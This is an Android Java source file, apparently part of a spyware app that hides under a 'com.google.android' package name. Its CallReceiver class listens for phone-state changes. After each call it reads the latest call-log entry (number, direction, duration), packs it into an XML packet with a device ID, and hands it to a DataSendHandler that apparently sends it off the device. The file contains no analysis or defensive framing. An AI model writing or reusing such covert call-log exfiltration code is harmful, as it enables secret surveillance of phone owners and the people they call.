package com.google.android.call;

import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.concurrent.TimeUnit;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.provider.CallLog;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.google.android.bs.DataSendHandler;
import com.google.android.bs.WorkTimeDefiner;

public class CallReceiver extends BroadcastReceiver {
	String phoneNumber = "";
	File outFile;
	FileWriter wrt;
	String str = "";
	FileReader fin;
	Context ctx;
	String date;
	SharedPreferences sp;
	private static String LOG_TAG = "callReciver";

	@Override
	public void onReceive(Context arg0, Intent intent) {
		Log.d(LOG_TAG, "start");
		// TODO Auto-generated method stub
		sp = PreferenceManager.getDefaultSharedPreferences(arg0);
		String call = sp.getString("KBD", "0");

		if (call.equals("0")) {
			return;
		}
		boolean isWork = WorkTimeDefiner.isDoWork(arg0);
		if (!isWork) {
			Log.d(LOG_TAG, "isWork return " + Boolean.toString(isWork));
			Log.d(LOG_TAG, "after isWork retrun 0");
			return;
		} else {
			Log.d(LOG_TAG, Boolean.toString(isWork));
		}

		date = logTime();
		ctx = arg0;

		if (intent.getAction()
				.equals("android.intent.action.NEW_OUTGOING_CALL")) {
			// получаем исходящий номер
			Bundle extr = intent.getExtras();
			Log.d(LOG_TAG, extr.getString(Intent.EXTRA_PHONE_NUMBER));
		} else if (intent.getAction().equals(
				"android.intent.action.PHONE_STATE")) {
			String phoneState = intent
					.getStringExtra(TelephonyManager.EXTRA_STATE);
			if (phoneState.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
				// телефон звонит, получаем входящий номер
				Bundle extr = intent.getExtras();
				Log.d(LOG_TAG, extr.getString(Intent.EXTRA_PHONE_NUMBER));
			} else if (phoneState.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
				// телефон находится в режиме звонка (набор номера / разговор)
			} else if (phoneState.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
				// телефон находится в ждущем режиме (событие наступает по
				// окончании разговора,
				// когда уже знаем номер и факт звонка
				try {
					// TimeUnit.SECONDS.sleep(1);
					TimeUnit.MILLISECONDS.sleep(1100);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				getCallDetails();
			}
		}
	}

	private void getCallDetails() {

		StringBuffer sb = new StringBuffer();
		Cursor managedCursor = ctx.getContentResolver().query(
				CallLog.Calls.CONTENT_URI, null, null, null, null);

		int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
		int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
		// int date = managedCursor.getColumnIndex( CallLog.Calls.DATE);
		int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);

		sb.append("Call Details :");

		managedCursor.moveToLast();
		String phNumber = managedCursor.getString(number);
		String callType = managedCursor.getString(type);
		// String callDate = managedCursor.getString( date );
		// Date callDayTime = new Date(Long.valueOf(callDate));
		String callDuration = managedCursor.getString(duration);
		String dir = null;
		int dircode = Integer.parseInt(callType);

		switch (dircode) {
		case CallLog.Calls.OUTGOING_TYPE:
			dir = "исх. звонок";
			break;

		case CallLog.Calls.INCOMING_TYPE:
			dir = "вх. звонок";
			break;

		case CallLog.Calls.MISSED_TYPE:
			dir = "пропущенный звонок";
			break;
		}

		sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- " + dir
				+ " \nCall Date:--- " + date + " \nCall duration in sec :--- "
				+ callDuration);
		sb.append("\n----------------------------------");
		managedCursor.close();

		String sendStr = "<packet><id>" + sp.getString("ID", "ID")
				+ "</id><time>" + date + "</time><type>4</type><app>" + dir
				+ "</app><ttl>" + phNumber + "</ttl><ntime>" + callDuration
				+ "</ntime></packet>";

		DataSendHandler dSH = new DataSendHandler(ctx);
		dSH.send(1, sendStr);

		Log.d(LOG_TAG, sb.toString());
	}

	@SuppressLint("SimpleDateFormat")
	private String logTime() {
		SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
		Calendar cal = Calendar.getInstance();
		cal.setTimeInMillis(System.currentTimeMillis());
		return "" + formatter.format(cal.getTime());

	}
}
